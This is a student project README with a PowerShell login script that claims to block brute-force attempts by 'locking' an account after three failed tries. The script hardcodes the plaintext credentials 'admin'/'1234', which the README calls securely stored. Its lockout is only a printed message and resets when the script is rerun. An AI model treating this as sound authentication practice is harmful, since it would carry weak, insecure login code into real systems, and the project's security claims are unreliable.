
# Brute Force Protection System
**Prepared by:** Yaqoob Haider & Safi Ullah Khan  

This cybersecurity project implements a native Windows PowerShell solution designed to mitigate automated brute-force attacks on user login interfaces through dynamic session tracking and automated account lockout thresholds.

---

## 🖥️ Project Presentation (Slides)
Teacher, you can view and review the project slides directly by choosing one of the methods below:

* 📄 **Direct PDF File:** Click on the `Brute_Force_Protection_Slides.pdf` file uploaded in this repository repository to scroll through the slides directly.
* 🌐 **Live Slide-Show (Recommended):** [👉 Click Here to View Presentation in Full-Screen Live Slideshow](https://github.com/yh404311-lang/login-brute-force-protection-system--by--yaqoob-haider-and-safi-ullah-khan/releases/download/v1.0.0/189139 )

---

## 🛡️ Working Mechanism of the Project
1. **User Authentication:** Prompts the user for a unique Username and Password.
2. **Credential Verification:** Dynamically checks input variables against securely stored administrative credentials.
3. **Failed Attempt Tracking:** Automatically increments a threshold counter variable for consecutive incorrect retries.
4. **Account Lockout:** Upon hitting the 3rd consecutive failed attempt, the verification loop breaks and enforces a critical security lockdown phase.

---

## 💻 PowerShell Implementation Code
You can clone this repository or copy-paste the clean code below to execute the live deployment script:

```powershell
# =================================================================
# Project: Brute Force Protection System
# Prepared by: Yaqoob Haider & Safi Ullah Khan
# =================================================================

Clear-Host
$line = "===================================================="
Write-Host $line -ForegroundColor Cyan
Write-Host "    BRUTE FORCE PROTECTION SYSTEM - ACTIVE DEPLOYMENT    " -ForegroundColor Cyan
Write-Host $line -ForegroundColor Cyan

# Define Secure Admin Credentials
$AdminUser = "admin"
$AdminPass = "1234"

# Policy Configuration
$MaxAttempts = 3
$Attempts = 0

# Authentication Loop
while ($Attempts -lt $MaxAttempts) {
    $Remaining = $MaxAttempts - $Attempts
    Write-Host "`n[Attempt $($Attempts + 1) of $MaxAttempts] - $Remaining attempts remaining." -ForegroundColor Yellow
    
    $User = Read-Host "Enter Username"
    $Pass = Read-Host "Enter Password"

    # Credential Verification
    if ($User -eq $AdminUser -and $Pass -eq $AdminPass) {
        Write-Host "`n[SUCCESS] Login Successful! Welcome back, $AdminUser." -ForegroundColor Green
        break
    } else {
        $Attempts++
        if ($Attempts -lt $MaxAttempts) {
            Write-Host "[WARNING] Invalid Credentials! Please try again." -ForegroundColor Magenta
        }
    }
}

# Account Lockout Phase
if ($Attempts -eq $MaxAttempts) {
    Write-Host "`n$line" -ForegroundColor Red
    Write-Host "CRITICAL ALERT: 3 FAILED ATTEMPTS DETECTED!" -ForegroundColor Red
    Write-Host "SECURITY ACTION: YOUR ACCOUNT IS NOW LOCKED." -ForegroundColor Red
    Write-Host "$line" -ForegroundColor Red
}
